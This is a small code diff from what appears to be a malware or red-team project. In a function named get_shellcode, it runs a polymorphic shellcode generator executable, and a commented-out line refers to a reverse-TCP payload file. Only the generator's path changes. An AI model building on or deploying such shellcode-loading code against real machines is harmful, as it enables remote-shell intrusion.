@@ -34,7 +34,7 @@ def get_shellcode():
     shellcodestr = "N"
     while(shellcodestr == "N"):
         # shellcodestr = subprocess.check_output(["cmd", "/C", "polymshell.exe ./reversetcp.bin"], text=True)
-        shellcodestr = subprocess.check_output(["cmd", "/C", 'C:/Users/malwa/Desktop/Coses/shpol.exe'], text=True)
+        shellcodestr = subprocess.check_output(["cmd", "/C", 'C:/Users/malwa/Desktop/Game/shpol.exe'], text=True)
         
     print("Popen:")
     print(shellcodestr)
